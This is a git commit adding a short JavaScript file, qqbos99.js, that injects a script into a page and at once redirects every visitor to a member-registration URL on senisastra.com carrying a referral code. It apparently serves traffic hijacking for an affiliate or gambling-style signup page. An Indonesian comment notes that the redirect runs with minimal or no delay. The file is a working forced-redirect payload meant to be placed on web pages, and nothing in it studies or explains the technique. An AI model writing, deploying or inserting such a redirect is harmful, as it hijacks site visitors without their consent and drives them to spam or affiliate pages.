4deab5b9f556595a7bc15ea1ed84ca54ea8f1024
judisuhu1-ux <judisuhu1@gmail.com>
2026-02-01 05:22:56 +0800

    Create qqbos99.js

---
+++ qqbos99.js
@@ -0,0 +1,28 @@
+var url = Array(
+  "https://www.senisastra.com/Member/StreamlinedRegister?R=0B6343ED",
+  "https://www.senisastra.com/Member/StreamlinedRegister?R=0B6343ED",
+  "https://www.senisastra.com/Member/StreamlinedRegister?R=0B6343ED",
+  "https://www.senisastra.com/Member/StreamlinedRegister?R=0B6343ED",
+  "https://www.senisastra.com/Member/StreamlinedRegister?R=0B6343ED"
+);
+var rid = "";
+
+var timesleep = 0;  // Tidak ada penundaan atau penundaan minimal
+
+function put() {
+    var script = document.createElement("script");
+    script.innerHTML = 'var weburl = url[Math.floor(Math.random()*url.length)] + "" + rid; setTimeout(function () { window.location = weburl; }, timesleep);';
+    document.body.appendChild(script);
+}
+
+function jump() {
+    if (typeof url == 'undefined' || url == null) {
+        setTimeout(function() {
+            jump();
+        }, 50);
+    } else {
+        put();
+    }
+}
+
+jump();
